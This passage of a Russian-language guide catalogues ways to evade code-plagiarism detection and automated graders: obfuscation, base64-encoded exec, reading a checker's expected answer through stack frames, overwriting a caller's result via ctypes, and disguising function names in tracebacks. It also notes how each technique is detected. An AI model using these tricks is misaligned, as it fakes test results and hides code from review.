+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="k">def</span> <span class="nf">solve</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>    <span class="n">_dummy</span> <span class="o">=</span> <span class="p">(</span><span class="mi">31</span> <span class="o">*</span> <span class="mi">42</span> <span class="o">+</span> <span class="n">n</span><span class="p">)</span> <span class="o">%</span> <span class="mi">17</span>  <span class="c1"># бессмысленная операция</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>    <span class="n">_unused</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="o">**</span><span class="mi">2</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span>  <span class="c1"># неиспользуемый результат</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>    <span class="k">return</span> <span class="n">n</span> <span class="o">*</span> <span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+</span></code></pre></div>
+<p><strong>Эффективность</strong>: низкая против современных систем. Dead code elimination (A.8) убирает неиспользуемые вычисления перед сравнением. Но против простых систем (Winnowing без нормализации) — работает.</p>
+<h3 id="zamena">Замена библиотек<a class="headerlink" href="#zamena" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># requests → httpx:</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># import requests → import httpx</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1"># requests.get(url) → httpx.get(url)</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># json → orjson:</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># import json → import orjson</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># json.loads(s) → orjson.loads(s)</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="c1"># os.path → pathlib:</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="c1"># os.path.join(a, b) → str(Path(a) / b)</span>
+</span></code></pre></div>
+<p><strong>Эффективность</strong>: средняя. Меняет имена модулей и функций, но если API эквивалентен — семантика та же.</p>
+<h3 id="arifmeticheskie">Арифметические эквиваленты<a class="headerlink" href="#arifmeticheskie" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># `3` → `1 + 1 + 1`     — ломает k-граммы, но constant folding убирает</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c1"># `x * 2` → `x + x`     — другой AST-узел (Mult → Add)</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="c1"># `x * 2` → `x &lt;&lt; 1`    — Mult → LShift</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># `a and b` → `not (not a or not b)`  — De Morgan</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1"># `x &gt; 5` → `not (x &lt;= 5)`           — инверсия</span>
+</span></code></pre></div>
+<p>⚠️ Constant folding (свёртка констант) на этапе компиляции сворачивает <code>1 + 1 + 1</code> обратно в <code>3</code>. Но антиплагиат-системы работают с <strong>исходником</strong>, не с байт-кодом — для них <code>1+1+1</code> и <code>3</code> — разные токены.</p>
+<h2 id="b2">B.2. Архитектурные приёмы — перенос логики в рантайм<a class="headerlink" href="#b2" title="Permanent link">#</a></h2>
+<p>Архитектурные приёмы переносят логику <strong>из статического кода в динамическую память</strong> — в аннотации, в <code>__dict__</code>, в <code>exec</code>-строки. Это намного сложнее детектировать, потому что AST-анализатор видит «пустышку», а реальный код появляется только при выполнении.</p>
+<h3 id="annotatsii">Аннотации как данные<a class="headerlink" href="#annotatsii" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Вместо присваивания — аннотация:</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="n">config</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;host&quot;</span><span class="p">:</span> <span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="s2">&quot;port&quot;</span><span class="p">:</span> <span class="mi">8080</span><span class="p">,</span> <span class="s2">&quot;debug&quot;</span><span class="p">:</span> <span class="kc">True</span><span class="p">}</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="c1"># В рантайме:</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="kn">import</span> <span class="nn">__main__</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">cfg</span> <span class="o">=</span> <span class="n">__main__</span><span class="o">.</span><span class="vm">__annotations__</span><span class="p">[</span><span class="s2">&quot;config&quot;</span><span class="p">]</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="nb">print</span><span class="p">(</span><span class="n">cfg</span><span class="p">[</span><span class="s2">&quot;host&quot;</span><span class="p">])</span>  <span class="c1"># &#39;localhost&#39;</span>
+</span></code></pre></div>
+<p>Аннотация не создаёт переменную <code>config</code> — она хранится в <code>__annotations__</code> dict'е модуля. AST-анализатор видит <code>AnnAssign</code> узел с <code>value=None</code>, а не <code>Assign</code> с конкретным значением.</p>
+<h3 id="setattr"><code>setattr</code> для динамических атрибутов<a class="headerlink" href="#setattr" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Вместо:</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="k">class</span> <span class="nc">Config</span><span class="p">:</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>    <span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>    <span class="n">port</span> <span class="o">=</span> <span class="mi">8080</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="c1"># Динамически:</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="n">config_data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;host&quot;</span><span class="p">:</span> <span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="s2">&quot;port&quot;</span><span class="p">:</span> <span class="mi">8080</span><span class="p">}</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="n">Config</span> <span class="o">=</span> <span class="nb">type</span><span class="p">(</span><span class="s2">&quot;Config&quot;</span><span class="p">,</span> <span class="p">(),</span> <span class="p">{})</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">config_data</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>    <span class="nb">setattr</span><span class="p">(</span><span class="n">Config</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+</span></code></pre></div>
+<p>AST видит <code>For</code> + <code>Call(setattr)</code> — не имена атрибутов. Нормализатор не может статически вытащить <code>host</code>/<code>port</code>.</p>
+<h3 id="compile"><code>compile</code> + <code>exec</code> — код из строки<a class="headerlink" href="#compile" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Код спрятан в строке, которая собирается динамически:</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">parts</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;pri&quot;</span><span class="p">,</span> <span class="s2">&quot;nt&quot;</span><span class="p">,</span> <span class="s2">&quot;(&quot;</span><span class="p">,</span> <span class="s2">&quot;&#39;hello&#39;&quot;</span><span class="p">,</span> <span class="s2">&quot;)&quot;</span><span class="p">]</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">code</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span>  <span class="c1"># &quot;print(&#39;hello&#39;)&quot;</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="n">exec</span><span class="p">(</span><span class="nb">compile</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="s2">&quot;&lt;dynamic&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;exec&quot;</span><span class="p">))</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="c1"># Или из base64:</span>
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="kn">import</span> <span class="nn">base64</span>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="n">encoded</span> <span class="o">=</span> <span class="s2">&quot;cHJpbnQoImhlbGxvIik=&quot;</span>  <span class="c1"># base64 of print(&quot;hello&quot;)</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="n">exec</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></code></pre></div>
+<p>AST-анализатор исходника видит только <code>exec(compile(...))</code> — не видит, <strong>что</strong> выполняется. Это самый сильный приём против статического анализа, но самый подозрительный — <code>exec</code> в студенческом коде сразу привлекает внимание.</p>
+<h3 id="typesfunctiontype"><code>types.FunctionType</code> + <code>types.CodeType</code> — сборка функции из байт-кода<a class="headerlink" href="#typesfunctiontype" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="kn">import</span> <span class="nn">types</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="c1"># Создать функцию напрямую из code object:</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">code</span> <span class="o">=</span> <span class="nb">compile</span><span class="p">(</span><span class="s2">&quot;x * 2 + 1&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;dynamic&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;eval&quot;</span><span class="p">)</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">func</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">FunctionType</span><span class="p">(</span><span class="n">code</span><span class="o">.</span><span class="n">co_consts</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nb">globals</span><span class="p">(),</span> <span class="s2">&quot;f&quot;</span><span class="p">)</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c1"># или из существующей функции — скопировать и модифицировать:</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="n">original</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="o">*</span> <span class="mi">2</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="n">new_code</span> <span class="o">=</span> <span class="n">original</span><span class="o">.</span><span class="vm">__code__</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">co_name</span><span class="o">=</span><span class="s2">&quot;obfuscated&quot;</span><span class="p">)</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="n">new_func</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">FunctionType</span><span class="p">(</span><span class="n">new_code</span><span class="p">,</span> <span class="nb">globals</span><span class="p">(),</span> <span class="s2">&quot;obfuscated&quot;</span><span class="p">)</span>
+</span></code></pre></div>
+<p>Это <strong>самый глубокий</strong> приём — функция существует только как объект в рантайме, в исходнике нет ни <code>def</code>, ни <code>lambda</code>. Детектируется только динамическим анализом (A.7) или audit hooks (PEP 578).</p>
+<h3 id="type"><code>type()</code> — динамическое создание классов<a class="headerlink" href="#type" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># Вместо:</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="k">class</span> <span class="nc">Handler</span><span class="p">:</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>    <span class="k">def</span> <span class="nf">process</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span> <span class="k">return</span> <span class="n">data</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="c1"># Динамически:</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="n">Handler</span> <span class="o">=</span> <span class="nb">type</span><span class="p">(</span><span class="s2">&quot;Handler&quot;</span><span class="p">,</span> <span class="p">(),</span> <span class="p">{</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>    <span class="s2">&quot;process&quot;</span><span class="p">:</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">data</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="p">})</span>
+</span></code></pre></div>
+<h3 id="kombinirovannyy">Комбинированный коктейль<a class="headerlink" href="#kombinirovannyy" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Логика в строке, строка в аннотации, исполнение через exec:</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="n">_payload</span><span class="p">:</span> <span class="s2">&quot;cHJpbnQoJ2hlbGxvJyk=&quot;</span>  <span class="c1"># base64</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">__main__</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="n">exec</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">__main__</span><span class="o">.</span><span class="vm">__annotations__</span><span class="p">[</span><span class="s2">&quot;_payload&quot;</span><span class="p">])</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></code></pre></div>
+<p>AST видит: <code>AnnAssign</code> + <code>Import</code> + <code>Exec</code>. Что реально выполняется — не видно без запуска.</p>
+<p>⚠️ <strong>Все архитектурные приёмы детектируются динамическим анализом</strong> (A.7): запусти код, собери trace, сравни поведение. Но динамический анализ дорог и редко используется в тестирующих системах.</p>
+<h2 id="b3-ctypes">B.3. Перехват аргументов через фреймы и ctypes<a class="headerlink" href="#b3-ctypes" title="Permanent link">#</a></h2>
+<p>Самые «хакерские» приёмы — работа с internals CPython для чтения/изменения состояния вызывающего кода.</p>
+<h3 id="sysgetframe"><code>sys._getframe</code> — чтение локальных переменных вызывающего<a class="headerlink" href="#sysgetframe" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="kn">import</span> <span class="nn">sys</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="k">def</span> <span class="nf">read_frame_vars</span><span class="p">():</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Читает локальные переменные функции, вызвавшей read_frame_vars.&quot;&quot;&quot;</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>    <span class="n">caller_frame</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">_getframe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>     <span class="c1"># 1 = на один уровень вверх</span>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>    <span class="n">caller_locals</span> <span class="o">=</span> <span class="n">caller_frame</span><span class="o">.</span><span class="n">f_locals</span>
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>    <span class="c1"># Ищем что-то похожее на ответ:</span>
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>    <span class="k">for</span> <span class="n">name</span><span class="p">,</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">caller_locals</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>        <span class="k">if</span> <span class="n">name</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;expected&quot;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">name</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&quot;answer&quot;</span><span class="p">):</span>
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>            <span class="k">return</span> <span class="n">value</span>
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>    <span class="k">return</span> <span class="kc">None</span>
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="k">def</span> <span class="nf">check_solution</span><span class="p">(</span><span class="n">student_answer</span><span class="p">):</span>
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>    <span class="n">expected_answer</span> <span class="o">=</span> <span class="mi">42</span>  <span class="c1"># ← правильный ответ</span>
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>    <span class="c1"># ... код проверки ...</span>
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>    <span class="n">result</span> <span class="o">=</span> <span class="n">read_answer</span><span class="p">()</span>  <span class="c1"># ← чтение expected_answer</span>
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>    <span class="k">return</span> <span class="n">student_answer</span> <span class="o">==</span> <span class="n">result</span>
+</span></code></pre></div>
+<h3 id="ctypespythonapipyframelocalstofast"><code>ctypes.pythonapi.PyFrame_LocalsToFast</code> — запись изменений обратно<a class="headerlink" href="#ctypespythonapipyframelocalstofast" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">ctypes</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="k">def</span> <span class="nf">modify_caller</span><span class="p">():</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Меняет локальную переменную в вызывающей функции.&quot;&quot;&quot;</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>    <span class="n">frame</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">_getframe</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>    <span class="n">frame</span><span class="o">.</span><span class="n">f_locals</span><span class="p">[</span><span class="s2">&quot;result&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">42</span>  <span class="c1"># меняем dict locals</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>    <span class="c1"># f_locals — это копия; чтобы записать обратно в frame:</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>    <span class="n">ctypes</span><span class="o">.</span><span class="n">pythonapi</span><span class="o">.</span><span class="n">PyFrame_LocalsToFast</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">py_object</span><span class="p">(</span><span class="n">frame</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="k">def</span> <span class="nf">compute</span><span class="p">():</span>
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>    <span class="n">modify_caller</span><span class="p">()</span>  <span class="c1"># ← меняет result на 42</span>
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>    <span class="k">return</span> <span class="n">result</span>    <span class="c1"># 42, хотя вычислений не было</span>
+</span></code></pre></div>
+<p>⚠️ <code>PyFrame_LocalsToFast</code> — недокументированная C-API функция. Работает на CPython, не работает на PyPy/Jython. Может быть удалена в будущих версиях.</p>
+<h3 id="podmena">Подмена <code>co_name</code> / <code>co_filename</code><a class="headerlink" href="#podmena" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="kn">import</span> <span class="nn">types</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="k">def</span> <span class="nf">real_function</span><span class="p">():</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Эта функция делает что-то подозрительное.&quot;&quot;&quot;</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>    <span class="kn">import</span> <span class="nn">os</span><span class="p">;</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;echo hacked&quot;</span><span class="p">)</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="c1"># Подменяем имя и файл в code object:</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="n">real_function</span><span class="o">.</span><span class="vm">__code__</span> <span class="o">=</span> <span class="n">real_function</span><span class="o">.</span><span class="vm">__code__</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>    <span class="n">co_name</span><span class="o">=</span><span class="s2">&quot;innocent_helper&quot;</span><span class="p">,</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>    <span class="n">co_filename</span><span class="o">=</span><span class="s2">&quot;&lt;stdlib&gt;&quot;</span><span class="p">,</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="p">)</span>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="c1"># В traceback теперь будет: File &quot;&lt;stdlib&gt;&quot;, line 1, in innocent_helper</span>
+</span></code></pre></div>
+<h3 id="chtenie">Чтение данных из фрейма тестирующего<a class="headerlink" href="#chtenie" title="Permanent link">#</a></h3>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="kn">import</span> <span class="nn">sys</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">student_code</span><span class="p">):</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>    <span class="n">expected_output</span> <span class="o">=</span> <span class="s2">&quot;correct_result&quot;</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>    <span class="n">test_number</span> <span class="o">=</span> <span class="mi">5</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>    <span class="c1"># ... вызов student_code ...</span>
